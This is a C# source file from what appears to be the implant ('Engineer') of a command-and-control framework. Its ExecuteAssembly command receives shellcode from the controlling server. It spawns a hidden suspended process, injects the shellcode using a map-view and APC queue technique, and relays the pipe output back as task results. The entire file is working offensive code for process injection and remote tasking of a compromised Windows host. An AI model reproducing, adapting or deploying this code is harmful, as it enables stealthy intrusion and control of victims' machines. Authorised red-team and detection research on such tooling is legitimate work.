using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using DynamicEngLoading;

using static DynamicEngLoading.h_DynInv_Methods;
using static DynamicEngLoading.h_DynInv.Win32;


namespace Engineer.Commands
{
    internal unsafe class ExecuteAssembly : EngineerCommand
    {
        public override string Name => "ExecuteAssembly";
        private string Output { get; set; } = "";
       
        public override async Task Execute(EngineerTask task)
        {
            try
            {
                //get some variuables ready for spawning process
                var si = new ProcessThreadsAPI._STARTUPINFOEX();
                si.StartupInfo.cb = Marshal.SizeOf(si);
                var pi = new ProcessThreadsAPI._PROCESS_INFORMATION();
                var pa = new WinBase._SECURITY_ATTRIBUTES();
                pa.nLength = Marshal.SizeOf(pa);
                var ta = new WinBase._SECURITY_ATTRIBUTES();
                ta.nLength = Marshal.SizeOf(ta);
                byte[]? shellcode = task.File;
                if (shellcode == null || shellcode.Length < 1)
                {
                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("Error: No file provided", task, EngTaskStatus.Failed,TaskResponseType.String);
                    return;
                }
                

                WinBase._SECURITY_ATTRIBUTES saAttr = new WinBase._SECURITY_ATTRIBUTES();
                // Set the bInheritHandle flag so pipe handles are inherited. 

                saAttr.nLength = Marshal.SizeOf(saAttr);
                saAttr.bInheritHandle = true;
                saAttr.lpSecurityDescriptor = IntPtr.Zero;

                // get the address of the saAttr
                IntPtr lpPipeAttributes = Marshal.AllocHGlobal(Marshal.SizeOf(saAttr));
                Marshal.StructureToPtr(saAttr, lpPipeAttributes, true);            

                //create a named pipe and use it to set Console.Out and Console.Error
                var pipeCreation = Ker32FuncWrapper.CreatePipe(out IntPtr outR_handle, out IntPtr outW_handle, ref saAttr, 0);
               var pipeCreation2 = Ker32FuncWrapper.CreatePipe(out IntPtr inR_handle, out IntPtr inW_handle, ref saAttr, 0);

                //call setHandleInformation to set the standard in write to not be inherited
                Ker32FuncWrapper.SetHandleInformation(inW_handle, Kernel32.HANDLE_FLAGS.INHERIT, 0);
                // //call setHandleInformation to set the standard out read to not be inherited
                Ker32FuncWrapper.SetHandleInformation(outR_handle, Kernel32.HANDLE_FLAGS.INHERIT, 0);

                //update the si hStdOutput to use our named pipe
                si.StartupInfo.hStdError = outW_handle;
                si.StartupInfo.hStdOutput = outW_handle;
                si.StartupInfo.hStdInput = inW_handle;
                si.StartupInfo.dwFlags = (int)Advapi32.CREATION_FLAGS.EXTENDED_STARTUPINFO_PRESENT | Kernel32.STARTF_USESTDHANDLES;
                si.StartupInfo.wShowWindow = (ushort)Kernel32.SW_HIDE;

                // spawn new process 
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults($"Attempting to create new process", task, EngTaskStatus.Running,TaskResponseType.String);
                bool spawneed = Ker32FuncWrapper.CreateProcessW($@"{SpawnTo.spawnToPath}", null, ref pa, ref ta, true, (uint)0x4 | (uint)Advapi32.CREATION_FLAGS.CREATE_NO_WINDOW | (uint)Advapi32.CREATION_FLAGS.EXTENDED_STARTUPINFO_PRESENT, IntPtr.Zero, "C:\\Windows\\System32", ref si, out pi);
                try
                {
                    bool? MapSuccess = null;
                    DateTime startTime = DateTime.Now;
                    Thread theThread = new Thread(() =>
                    {
                        MapSuccess = Inj_techs.MapViewAPCResumeThread(shellcode, pi.hProcess, pi.hThread);
                    } );
                    theThread.Start();
                    
                    //wait until MapSuccess is set to true or false
                    while (MapSuccess == null)
                    {
                        Thread.Sleep(100);
                    }
                    if(MapSuccess == true)
                    {
                        var buffer = new byte[1024];
                        uint bytesRead = 0;
                        uint timeoutInterval = 1000;
                        do
                        {
                            var readSuccess = Ker32FuncWrapper.ReadFile(outR_handle, buffer, (uint)buffer.Length, out bytesRead, IntPtr.Zero);
                            if (readSuccess == false)
                            {
                                Console.WriteLine($"read failed with error code {Marshal.GetLastWin32Error()}");
                            }
                            if (task.cancelToken.IsCancellationRequested)
                            {
                                theThread.Abort();
                                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("[-]Task Cancelled", task, EngTaskStatus.Cancelled, TaskResponseType.String);
                                return;
                            }
                            if (bytesRead > 0)
                            {
                                Console.WriteLine($"read {bytesRead} bytes from pipe");
                                Output = Encoding.UTF8.GetString(buffer, 0, (int)bytesRead);
                                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(Output, task, EngTaskStatus.Running, TaskResponseType.String);
                                bytesRead = 0;
                            }
                            else if (bytesRead == 0 && DateTime.Now.Subtract(startTime).TotalMinutes > 2)
                            {
                                Console.WriteLine("no bytes read from pipe in 2 minutes");
                                break;
                            }
                            else
                            {
                                Console.WriteLine("Sleeping no data from pipe");
                                Thread.Sleep(1000);
                            }
                            //if the swpaneed process has exited then exit the loop 
                            uint waitResult = Ker32FuncWrapper.WaitForSingleObject(pi.hProcess, timeoutInterval);

                            if (waitResult == 0x00000000)
                            {
                                // The process has exited
                                break;
                            }
                            else if (waitResult == 0x00000102) // WAIT_TIMEOUT
                            {
                                // The time-out interval elapsed, continue waiting
                            }
                        }
                        while (bytesRead > 0 || DateTime.Now.Subtract(startTime).TotalMinutes < 2);
                    }
                    else
                    {
                        ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("[-]MapViewLoadShellcode failed", task, EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                    }
                    //once the process is done, read the output from the pipe and send it back to the server
                    // Console.WriteLine("Exited while loop");
                    byte[] buffer2 = new byte[1024];
                    var readSuccess2 = Ker32FuncWrapper.ReadFile(outR_handle, buffer2, (uint)buffer2.Length, out uint bytesRead2, IntPtr.Zero);
                    Output = Encoding.UTF8.GetString(buffer2, 0, (int)bytesRead2);
                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(Output, task, EngTaskStatus.Complete, TaskResponseType.String);
                }
              
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                    Console.WriteLine(ex.StackTrace);
                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(ex.Message, task, EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                }
                
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                Console.WriteLine(e.StackTrace);
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(e.Message, task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
            }
        }
    }
}
